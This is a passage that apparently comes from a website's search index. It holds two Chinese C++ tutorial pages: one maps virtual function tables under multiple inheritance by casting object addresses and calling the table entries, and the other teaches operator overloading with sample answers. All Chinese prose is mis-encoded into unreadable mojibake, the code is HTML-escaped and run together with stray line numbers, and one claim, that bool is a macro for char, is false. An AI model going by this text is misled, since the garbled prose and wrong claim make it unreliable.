int b;public: Base1() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base1::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base1::Fn_2 called ... &quot;); &#125;&#125;;class Base2&#123;private: int c;public: Base2() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Base2::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Base2::Fn_4 called ... &quot;); &#125;&#125;;class Derived : public Base1, public Base2&#123;private: int d;public: Derived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;Derived::Fn_5 called ... &quot;); &#125; virtual void Fn_6() &#123; printf(&quot;Derived::Fn_6 called ... &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; // æŸ¥çœ‹ derived çš„è™šå‡½æ•°è¡¨ Derived derived; // è§‚å¯Ÿå¤§å° printf(&quot;%d &quot;, sizeof(derived)); // æœ‰2ä¸ªè™šè¡¨ // é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void (*pFunction)(void); pFunction pFn; // ç¬¬1ä¸ªè™šè¡¨ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)&amp;derived); // å¯¹è±¡çš„ç¬¬1ä¸ªè™šè¡¨åœ°å€ for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;derived) + i); if (!temp) // è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œè·³å‡ºæœ¬æ¬¡å¾ªç¯ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; printf(&quot;%d &quot;, sizeof(Base1)); // è§‚å¯ŸBase1çš„å¤§å°ï¼Œå› ä¸ºæ‰¾ç¬¬2ä¸ªè™šè¡¨è¦è·³è¿‡Base1å çš„å†…å­˜ç©ºé—´ // ç¬¬2ä¸ªè™šè¡¨ DWORD vptr2 = (DWORD)&amp;derived + sizeof(Base1); printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)vptr2); // å¯¹è±¡çš„ç¬¬2ä¸ªè™šè¡¨åœ°å€ for (int j = 0; j &lt; 2; j++) &#123; int temp = *((DWORD*)(*(DWORD*)vptr2) + j); if (!temp) // è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base1ç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Base2ç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_3 è™šå‡½æ•°Fn_4 SubDerivedç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_5 è™šå‡½æ•°Fn_6 123class Base1&#123;...&#125;;class Base2&#123;...&#125;;class Derived : public Base1, public Base2&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base1 0x0012FF68 vptr1=0x0042205C 0x0012FF6C a=1 0x0012FF70 b=2 Base2 0x0012FF74 vptr2=0x00422110 0x0012FF78 c=3 Derived 0x0012FF7C d=4 è™šè¡¨1 åœ°å€ å€¼ å†…å®¹ \"vptr1-> 0x0042205C 0x00401050 Base1::Fn_1å‡½æ•°åœ°å€ 0x00422060 0x0040105F Base1::Fn_2å‡½æ•°åœ°å€ 0x00422064 0x0040104B Derived::Fn_5å‡½æ•°åœ°å€ 0x00422068 0x0040106E Derived::Fn_6å‡½æ•°åœ°å€ è™šè¡¨2 åœ°å€ å€¼ å†…å®¹ \"vptr2->\" 0x00422110 0x00401055 Base2::Fn_3å‡½æ•°åœ°å€ 0x00422114 0x0040105A Base2::Fn_4å‡½æ•°åœ°å€ å®éªŒæ—¶é‡åˆ°çš„ä»£ç è¿è¡Œé—®é¢˜è¿™æ®µé˜²æ­¢è¯»è¿‡å¤´çš„ä»£ç åªèƒ½ä¿è¯è¯»è¿‡äº†ä¹‹åå€¼ä¸º0çš„æƒ…å†µå‡†ï¼Œä¸ä¸º0çš„è¯ï¼Œè¿˜æ˜¯ä¼ ç»™pFnï¼Œå‡†å¤‡è°ƒç”¨ï¼Œä¼šæŠ¥0xC0000005ã€‚1234if (!temp) // è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„&#123; break;&#125; å¤šé‡ç»§æ‰¿+æœ‰å‡½æ•°è¦†ç›– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base1&#123;private: int a; int b;public: Base1() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base1::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base1::Fn_2 called ... &quot;); &#125;&#125;;class Base2&#123;private: int c;public: Base2() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Base2::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Base2::Fn_4 called ... &quot;); &#125;&#125;;class Derived : public Base1, public Base2&#123;private: int d;public: Derived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; virtual void Fn_5() &#123; printf(&quot;Derived::Fn_5 called ... &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; // æŸ¥çœ‹ derived çš„è™šå‡½æ•°è¡¨ Derived derived; // è§‚å¯Ÿå¤§å° printf(&quot;%d &quot;, sizeof(derived)); // æœ‰2ä¸ªè™šè¡¨ // é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void (*pFunction)(void); pFunction pFn; // ç¬¬1ä¸ªè™šè¡¨ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)&amp;derived); // å¯¹è±¡çš„ç¬¬1ä¸ªè™šè¡¨åœ°å€ for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;derived) + i); if (!temp) // è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œè·³å‡ºæœ¬æ¬¡å¾ªç¯ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; printf(&quot;%d &quot;, sizeof(Base1)); // è§‚å¯ŸBase1çš„å¤§å°ï¼Œå› ä¸ºæ‰¾ç¬¬2ä¸ªè™šè¡¨è¦è·³è¿‡Base1å çš„å†…å­˜ç©ºé—´ // ç¬¬2ä¸ªè™šè¡¨ DWORD vptr2 = (DWORD)&amp;derived + sizeof(Base1); printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)vptr2); // å¯¹è±¡çš„ç¬¬2ä¸ªè™šè¡¨åœ°å€ for (int j = 0; j &lt; 2; j++) &#123; int temp = *((DWORD*)(*(DWORD*)vptr2) + j); if (!temp) // è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base1ç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Base2ç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_3 è™šå‡½æ•°Fn_4 ç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_1ï¼Œoverride è™šå‡½æ•°Fn_3ï¼Œoverride è™šå‡½æ•°Fn_5 123class Base1&#123;...&#125;;class Base2&#123;...&#125;;class Derived : public Base1, public Base2&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base1 0x0012FF68 vptr1=0x0042205C 0x0012FF6C a=1 0x0012FF70 b=2 Base2 0x0012FF74 vptr2=0x00422110 0x0012FF78 c=3 Derived 0x0012FF7C d=4 è™šè¡¨1 åœ°å€ å€¼ å†…å®¹ \"vptr1->\"\" 0x0042205C 0x00401064 Derived::Fn_1å‡½æ•°åœ°å€ 0x00422060 0x0040105F Base1::Fn_2å‡½æ•°åœ°å€ 0x00422064 0x0040104B Derived::Fn_5å‡½æ•°åœ°å€ è™šè¡¨2 åœ°å€ å€¼ å†…å®¹ \"vptr2->\" 0x00422110 0x00401069 Derived::Fn_3å‡½æ•°åœ°å€ 0x00422114 0x0040105A Base2::Fn_4å‡½æ•°åœ°å€ å°ç»“ å¸¦æœ‰è™šå‡½æ•°çš„ç±»ï¼Œå…¶å¯¹è±¡èµ·å§‹å¤„æ˜¯vptrï¼Œç„¶åæ‰æ˜¯æˆå‘˜å˜é‡ã€‚vptræŒ‡å‘vtableï¼Œvtableä¸­ä¾æ¬¡å­˜æ”¾ç±»ä¸­è™šå‡½æ•°çš„å‡½æ•°åœ°å€ï¼ˆè™šå‡½æ•°åœ¨ç±»ä¸­å†™çš„å…ˆåé¡ºåºï¼‰ï¼Œæœ‰å‡ ä¸ªè™šå‡½æ•°ï¼Œè™šè¡¨ä¸­å°±æœ‰å‡ ä¸ªåœ°å€ã€‚ å¦‚æœå­ç±»æ²¡æœ‰å¯¹åŸºç±»å£°æ˜çš„è™šå‡½æ•°è¿›è¡Œé‡å†™ï¼ˆoverrideï¼‰ï¼Œé‚£ä¹ˆè¡¨é¡¹ä¸­çš„æ˜¯çˆ¶ç±»çš„è™šå‡½æ•°åœ°å€ã€‚ å¦‚æœé‡å†™äº†ï¼Œè¿™ä¸€é¡¹åˆ™æ˜¯å­ç±»é‡å†™çš„å‡½æ•°åœ°å€ã€‚ å¯¹äºå¤šé‡ç»§æ‰¿ï¼Œè™šè¡¨çš„ä¸ªæ•°=ç»§æ‰¿çˆ¶ç±»çš„ä¸ªæ•°ã€‚å†…å­˜å¸ƒå±€å…ˆæ˜¯ç¬¬ä¸€ä¸ªçˆ¶ç±»çš„å†…å­˜ï¼Œç„¶åæ˜¯ç¬¬äºŒä¸ªçˆ¶ç±»çš„å†…å­˜ï¼Œâ€¦ï¼Œæœ€åæ‰æ˜¯å­ç±»çš„ã€‚ å­ç±»æ–°å¢çš„è™šå‡½æ•°å‡½æ•°åœ°å€æ˜¯åœ¨ç¬¬ä¸€ä¸ªè™šè¡¨ä¸­ã€‚ overrideäº†çˆ¶ç±»å“ªä¸ªçš„è™šå‡½æ•°å°±åœ¨å“ªä¸ªè¡¨ä¸­ï¼Œæ²¡æœ‰overrideå°±ä»æ˜¯çˆ¶ç±»çš„ã€‚ ä¸ºä»€ä¹ˆè¦å¤šä¸ªè™šè¡¨ï¼Ÿè¿˜æ˜¯ä»¥å‰é¢çš„ä¸ºä¾‹ï¼ŒDerivedç±»åŒæ—¶ç»§æ‰¿äº†Base1å’ŒBase2ç±»ï¼ŒBase1ç±»å’ŒBase2ç±»éƒ½æœ‰è‡ªå·±çš„è™šè¡¨ï¼Œç„¶åDerivedç±»ä¸ºä»€ä¹ˆè¦æœ‰ä¸¤ä¸ªè™šè¡¨ï¼Ÿç­”ï¼šå› ä¸ºè¦ç¡®ä¿å¤šæ€èƒ½æ­£ç¡®å·¥ä½œã€‚åœ¨è¿™ä¸ªç»§æ‰¿å…³ç³»ä¸‹çš„upcastingï¼šå¯ä»¥ç”¨Base1ç±»å‹çš„æŒ‡é’ˆ/å¼•ç”¨æ¥è®¿é—®è®¿é—®Derivedå¯¹è±¡å¯ä»¥ç”¨Base2ç±»å‹çš„æŒ‡é’ˆ/å¼•ç”¨æ¥è®¿é—®è®¿é—®Derivedå¯¹è±¡è¦ç¡®ä¿ä½¿ç”¨Base1ç±»å‹çš„æŒ‡é’ˆ/å¼•ç”¨å’ŒBase2ç±»å‹çš„æŒ‡é’ˆ/å¼•ç”¨è®¿é—®Derivedå¯¹è±¡æ—¶ï¼Œå¯ä»¥æ­£ç¡®åœ°è°ƒç”¨è™šå‡½æ•°ï¼šå½“é€šè¿‡Base1ç±»å‹çš„å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œéœ€è¦ä½¿ç”¨Base1çš„è™šè¡¨æ¥ç¡®å®šè¦è°ƒç”¨çš„è™šå‡½æ•°é€šè¿‡Base2ç±»å‹çš„å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œï¼Œéœ€è¦ä½¿ç”¨Base2çš„è™šè¡¨æ¥ç¡®å®šè¦è°ƒç”¨çš„è™šå‡½æ•°å¦‚æœä¸è®¾è®¡æˆä¸¤ä¸ªè™šè¡¨ï¼Œå½“è™šå‡½æ•°é‡å†™ï¼Œæˆ–ï¼Œå¤šæ€è°ƒæ—¶è°ƒç”¨çš„å“ªä¸ªå‡½æ•°ä½ çŸ¥é“å—"},{"title":"è¿ç®—ç¬¦é‡è½½","path":"/wiki/C++/è¿ç®—ç¬¦é‡è½½.html","content":"å‰è¨€ åœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥ç”¨è¿ç®—ç¬¦å¯¹åŸºæœ¬ç±»å‹è¿›è¡Œæ“ä½œï¼Œä»¥å¤§äºå·ä¸ºä¾‹ 12345int a = 1;int b = 2;int r1 = a &gt; b; // ä¸æˆç«‹ï¼Œr1=0int r2 = a &lt; b; // æˆç«‹ï¼Œr2=1 å¦‚æœæˆ‘ä»¬æƒ³å¯¹è‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ç»“æ„ä½“/ç±»è¿›è¡Œæ¯”è¾ƒæ“ä½œã€‚æ€ä¹ˆæ¯”è¾ƒï¼Ÿç›´æ¥å†™å¯¹è±¡1&gt;å¯¹è±¡2çš„ä»£ç ï¼Œæ˜¯ç¼–è¯‘ä¸è¿‡å»çš„ã€‚æˆ‘ä»¬éœ€è¦è‡ªå·±å®šä¹‰è¿™ä¸¤ä¸ªå¯¹è±¡æ€ä¹ˆä¸ªå¤§å°æ³•ï¼Œå‡è®¾è¿™ä¸ªç±»æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªxï¼Œä¸€ä¸ªyï¼Œæˆ‘ä»¬è®¤ä¸ºå½“è¿™ä¸ªå¯¹è±¡çš„xå’Œyéƒ½å¤§äºå¦ä¸€ä¸ªå¯¹è±¡çš„xå’Œyæ—¶ï¼Œè®¤ä¸ºè¿™ä¸ªå¯¹è±¡å¤§ï¼Œé‚£ä¹ˆå¯ä»¥å†™å‡ºä»¥ä¸‹çš„ä»£ç  123456789101112131415161718192021222324#include &lt;stdio.h&gt;class Number&#123;private: int x; int y;public: Number(int x, int y) : x(x), y(y) &#123;&#125; bool Max(const Number &amp;n) &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y; // ä¸¤ä¸ªéƒ½å¤§ï¼Œå°±ç®—è¿™ä¸ªå¯¹è±¡å¤§ &#125;&#125;;void main()&#123; Number n1(3, 4), n2(1, 2); bool r = n1.Max(n2); //å°†è¦æ¯”è¾ƒçš„å¯¹è±¡n2ä¼ è¿›å»æ¯”è¾ƒ printf(&quot;%d &quot;, r); return;&#125; C++å¼•å…¥boolç±»å‹ï¼Œå 1å­—èŠ‚ï¼Œå…¶å®æ˜¯charç±»å‹çš„å®å®šä¹‰ æƒ³å°†n1ä¸n2å¯¹è±¡è¿›è¡Œæ¯”è¾ƒï¼Œéœ€è¦å°†n2å¯¹è±¡ä½œä¸ºn1æˆå‘˜å‡½æ•°Maxçš„å‚æ•°ä¼ å…¥ã€‚ 1int r = n1.Max(n2); //å°†è¦æ¯”è¾ƒçš„å¯¹è±¡n2ä¼ è¿›å»æ¯”è¾ƒ è¿™æ ·ä½¿ç”¨èµ·æ¥ä¸æ–¹ä¾¿ï¼Œèƒ½å¦åšåˆ°åƒåŸºæœ¬ç±»å‹é‚£æ ·çš„å½¢å¼è¿›è¡Œæ¯”è¾ƒï¼Ÿ 123int r1 = a &gt; b; // åŸºæœ¬ç±»å‹æ¯”è¾ƒint r2 = n1 &gt; n2; //å¯¹è±¡æ¯”è¾ƒ C++æä¾›äº†è¿™æ ·çš„æ–¹æ³•ï¼šé‡è½½è¿ç®—ç¬¦ã€‚ è¿ç®—ç¬¦é‡è½½ è¯­æ³• æˆå‘˜å‡½æ•°å½¢å¼ 1234class ClassName &#123;public: ReturnType operatorX(ArgumentType arg);&#125;; operatorX æ˜¯è¿ç®—ç¬¦å‡½æ•°ï¼ŒX æ˜¯è¦é‡è½½çš„è¿ç®—ç¬¦ï¼Œä¾‹å¦‚ +ã€-ã€* ç­‰ã€‚ éæˆå‘˜å‡½æ•°å½¢å¼ 1ReturnType operatorX(const ClassName &amp;obj1, ArgumentType arg); ä¾‹ å°†å‰è¨€çš„ä¾‹å­æ”¹æˆè¿ç®—ç¬¦é‡è½½çš„å½¢å¼ 123456789101112131415161718192021222324#include &lt;stdio.h&gt;class Number&#123;private: int x; int y;public: Number(int x, int y) : x(x), y(y) &#123;&#125; bool operator&gt;(const Number &amp;n) //å’Œæ™®é€šæˆå‘˜å‡½æ•°ä¸€æ ·ï¼Œç¼–è¯‘æ—¶ä¹Ÿä¼šä¼ thisæŒ‡é’ˆ &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y; &#125;&#125;;void main()&#123; Number n1(3, 4), n2(1, 2); bool r = n1 &gt; n2; // åƒåŸºæœ¬ç±»å‹é‚£æ ·è¿›è¡Œä½¿ç”¨äº† printf(&quot;%d &quot;, r); return;&#125; ä½¿ç”¨æ—¶å°±å¯ä»¥åƒåŸºæœ¬ç±»å‹é‚£æ ·è¿›è¡Œä½¿ç”¨äº†ï¼Œå¾ˆæ–¹ä¾¿ å‡½æ•°è¿”å›ç±»å‹ï¼Œå‚æ•°ï¼Œå‡½æ•°ä½“æ€ä¹ˆå†™ï¼Œå…·ä½“çœ‹ç»ƒä¹ é¢˜1 Numberç±»é‡è½½1234567891011Number&amp; operator++();Number&amp; operator--();Number operator+(Number&amp; n);Number operator-(Number&amp; n);Number operator*(Number&amp; n);Number operator/(Number&amp; n);bool operator&lt;(Number&amp; n);bool operator==(Number&amp; n);bool operator&gt;(Number&amp; n) &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y;&#125; å¦‚ä½•ç¡®å®šè¿”å›ç±»å‹ æ¯”å¦‚++è¿ç®—ç¬¦ï¼Œæ­£å¸¸æƒ…å†µä¸‹åŸºæœ¬ç±»å‹æ¯”å¦‚intç±»å‹++å®Œåä»æ˜¯intç±»å‹ï¼Œæ‰€ä»¥ä¸Šè¾¹Numberç±»é‡è½½++è¿ç®—ç¬¦åç±»å‹ä»è¦æ˜¯Numberç±»å‹ï¼Œå› ä¸ºè¦å®é™…ä¿®æ”¹ï¼Œè€Œä¸æ˜¯æ”¹çš„å‰¯æœ¬ï¼Œæ‰€ä»¥è¿™é‡Œçš„å‡½æ•°è¿”å›ç±»å‹æ˜¯Number&amp; 123456Number&amp; operator++()&#123; x++; y++; return *this; //è¿”å›å½“å‰å¯¹è±¡&#125; è€Œæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œè¿”å›ç±»å‹æ˜¯boolç±»å‹ï¼ŒçœŸæˆ–å‡ã€‚ å½“è¿ç®—ç¬¦é‡è½½æ¶‰åŠåˆ°ä¿®æ”¹å¯¹è±¡æœ¬èº«æ—¶ï¼ˆå¦‚ ++ æˆ– --ï¼‰ï¼Œé€šå¸¸è¿”å›å¼•ç”¨æ˜¯åˆé€‚çš„ã€‚ å½“è¿ç®—ç¬¦åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶ï¼ˆå¦‚ +ã€-ã€*ã€/ï¼‰ï¼Œåˆ™è¿”å›å€¼ç±»å‹åº”è¯¥æ˜¯å¯¹è±¡æœ¬èº«ã€‚è¿™æ ·åšæ—¢é¿å…äº†ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶ï¼Œåˆä¿æŒäº†è¿ç®—ç¬¦çš„ç›´è§‚å«ä¹‰ã€‚ å¯¹äºæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œç”±äºæ¯”è¾ƒçš„ç»“æœæ˜¯å¸ƒå°”å€¼ï¼Œå› æ­¤è¿”å› bool æ˜¯åˆé€‚çš„ã€‚ æœªæ¥å¯èƒ½ç»å¸¸ç”¨åˆ°éœ€è¦é‡è½½çš„è¿ç®—ç¬¦ï¼š&gt;ï¼Œ&lt;ï¼Œ=ï¼Œ== æœ¬è´¨ è¿ç®—ç¬¦é‡è½½çš„æœ¬è´¨å°±æ˜¯ç»™è¿ç®—ç¬¦å¯¹åº”ä¸€ä¸ªå…·ä½“çš„å‡½æ•°ã€‚å½“ç¼–è¯‘å™¨æ‰§è¡Œåˆ° bool r = n1 &gt; n2;è¿™è¡Œä»£ç ï¼ŒèƒŒåå…¶å®ä¹Ÿæ˜¯è°ƒç”¨æˆå‘˜å‡½æ•°ã€‚å¯ä»¥çœ‹åˆ°å‰è¨€ä¸­çš„ä¾‹å­ï¼Œå’Œï¼Œé‡è½½è¿ç®—ç¬¦å&gt;çš„åæ±‡ç¼–æ˜¯ä¸€æ ·çš„ã€‚ æˆå‘˜å‡½æ•°çš„æ–¹å¼ï¼Œæ²¡é‡è½½é‡è½½>è¿ç®—ç¬¦ å°ç»“ è¿ç®—ç¬¦é‡è½½å°±æ˜¯å‡½æ•°æ›¿æ¢ï¼Œè®©å¼€å‘è€…å†™ä»£ç æ—¶æ›´æ–¹ä¾¿ éœ€è¦è‡ªå®šä¹‰è§„åˆ™ã€‚æ¯”å¦‚è‡ªå®šä¹‰ä¸¤ä¸ªå¯¹è±¡æ¯”å¤§å°ï¼Œéœ€è¦é‡è½½&gt;è¿ç®—ç¬¦ ç»ƒä¹  å†™ä¸€ä»½ä»£ç ï¼Œå®šä¹‰ä¸€ä¸ªç±»ï¼Œä½¿ç”¨ä¸¤ç§æ–¹å¼å¯¹ç±»è¿›è¡Œ+ã€-ã€*ã€/ã€&gt;ã€&lt;ã€&gt;=ã€&lt;=ï¼Œ++ï¼Œ--è¿™äº›è¿ç®—ç¬¦çš„é‡è½½ æ–¹å¼ä¸€ï¼šæˆå‘˜å‡½æ•° æ–¹å¼äºŒï¼šå‹å…ƒå‡½æ•° å‚è€ƒç­”æ¡ˆ+ã€-ã€*ã€/ã€&gt;ã€&lt;ã€&gt;=ã€&lt;=è¿ç®—ç¬¦çš„é‡è½½ æ–¹å¼ï¼šæˆå‘˜å‡½æ•°æ–¹å¼ï¼šå‹å…ƒå‡½æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // é‡è½½è¿ç®—ç¬¦ä½œä¸ºæˆå‘˜å‡½æ•° MyNumber operator+(const MyNumber&amp; other) &#123; return MyNumber(value + other.value); &#125; MyNumber operator-(const MyNumber&amp; other) &#123; return MyNumber(value - other.value); &#125; MyNumber operator*(const MyNumber&amp; other) &#123; return MyNumber(value * other.value); &#125; MyNumber operator/(const MyNumber&amp; other) &#123; if (other.value == 0) &#123; std::cerr &lt;&lt; &quot;Division by zero error!&quot; &lt;&lt; std::endl; return MyNumber(0); &#125; return MyNumber(value / other.value); &#125; bool operator&gt;(const MyNumber&amp; other) &#123; return value &gt; other.value; &#125; bool operator&lt;(const MyNumber&amp; other) &#123; return value &lt; other.value; &#125; bool operator&gt;=(const MyNumber&amp; other) &#123; return value &gt;= other.value; &#125; bool operator&lt;=(const MyNumber&amp; other) &#123; return value &lt;= other.value; &#125;&#125;;12345678910111213141516171819202122232425#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // é‡è½½è¿ç®—ç¬¦ä½œä¸ºå‹å…ƒå‡½æ•° friend MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator-(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator*(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator/(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&gt;(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&lt;(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&gt;=(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&lt;=(const MyNumber&amp; a, const MyNumber&amp; b);&#125;;MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + b.value);&#125;// åŒæ ·æ–¹å¼å®ç°å…¶ä»–é‡è½½çš„è¿ç®—ç¬¦...å¯¹äº++å’Œâ€“è¿ç®—ç¬¦çš„é‡è½½ æ–¹å¼ï¼šæˆå‘˜å‡½æ•°æ–¹å¼ï¼šå‹å…ƒå‡½æ•°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // å‰ç¼€ ++ MyNumber&amp; operator++() &#123; ++value; return *this; &#125; // åç¼€ ++ MyNumber operator++(int) &#123; MyNumber temp = *this; ++(*this); return temp; &#125; // å‰ç¼€ -- MyNumber&amp; operator--() &#123; --value; return *this; &#125; // åç¼€ -- MyNumber operator--(int) &#123; MyNumber temp = *this; --(*this); return temp; &#125; // å…¶ä»–è¿ç®—ç¬¦é‡è½½...&#125;;int main() &#123; MyNumber num(5); ++num; // ä½¿ç”¨å‰ç¼€ ++ num++; // ä½¿ç”¨åç¼€ ++ --num; // ä½¿ç”¨å‰ç¼€ -- num--; // ä½¿ç”¨åç¼€ -- std::cout &lt;&lt; &quot;Current Value: &quot; &lt;&lt; num.value &lt;&lt; std::endl; return 0;&#125;å¯¹äº ++ å’Œ -- è¿™æ ·çš„ä¸€å…ƒè¿ç®—ç¬¦ï¼Œé€šå¸¸ä¸éœ€è¦ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œå› ä¸ºå®ƒä»¬ä»…ä½œç”¨äºå•ä¸ªå¯¹è±¡ã€‚ç„¶è€Œï¼Œå¦‚æœç¡®å®éœ€è¦ï¼Œå¯ä»¥è¿™æ ·å®ç°ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // å£°æ˜å‹å…ƒå‡½æ•° friend MyNumber&amp; operator++(MyNumber&amp; num); friend MyNumber operator++(MyNumber&amp; num, int); friend MyNumber&amp; operator--(MyNumber&amp; num); friend MyNumber operator--(MyNumber&amp; num, int); // å…¶ä»–è¿ç®—ç¬¦é‡è½½...&#125;;// å®ç°å‹å…ƒå‡½æ•°MyNumber&amp; operator++(MyNumber&amp; num) &#123; ++num.value; return num;&#125;MyNumber operator++(MyNumber&amp; num, int) &#123; MyNumber temp = num; ++num.value; return temp;&#125;MyNumber&amp; operator--(MyNumber&amp; num) &#123; --num.value; return num;&#125;MyNumber operator--(MyNumber&amp; num, int) &#123; MyNumber temp = num; --num.value; return temp;&#125;int main() &#123; MyNumber num(5); ++num; // ä½¿ç”¨å‰ç¼€ ++ num++; // ä½¿ç”¨åç¼€ ++ --num; // ä½¿ç”¨å‰ç¼€ -- num--; // ä½¿ç”¨åç¼€ -- std::cout &lt;&lt; &quot;Current Value: &quot; &lt;&lt; num.value &lt;&lt; std::endl; return 0;&#125; å¦‚ä½•ç¡®å®šé‡è½½è¿ç®—ç¬¦çš„å‡½æ•°è¿”å›ç±»å‹è¿ç®—ç¬¦è®¡ç®—ç»“æœæ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œè¿”å›å€¼åˆ™æ˜¯åˆ›å»ºçš„å¯¹è±¡æœ¬èº«ã€‚è¿™æ ·åšæ—¢é¿å…äº†ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶ï¼Œåˆä¿æŒäº†è¿ç®—ç¬¦çš„ç›´è§‚å«ä¹‰ã€‚+ã€-ã€*ã€/ï¼Œä»¥åŠ æ³•ä¸ºä¾‹ï¼Œéƒ½æ˜¯ç»“æœ=æ“ä½œæ•°1 + æ“ä½œæ•°2ï¼Œä¸¤æ“ä½œæ•°è®¡ç®—åä¸ä¼šå˜ï¼Œä¸¤æ•°ç›¸åŠ çš„ç»“æœæ˜¯å­˜åˆ°ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ä¸­ï¼Œéœ€è¦æŠŠè¿™ä¸ªåˆ›å»ºçš„å¯¹è±¡è¿”å›å‡ºå»ï¼Œæ‰€ä»¥+çš„è¿ç®—ç¬¦é‡è½½æ˜¯ï¼š1234567891011//æˆå‘˜å‡½æ•°å½¢å¼MyNumber operator+(const MyNumber&amp; other) &#123; return MyNumber(value + other.value);&#125; //å‹å…ƒå‡½æ•°å½¢å¼MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + 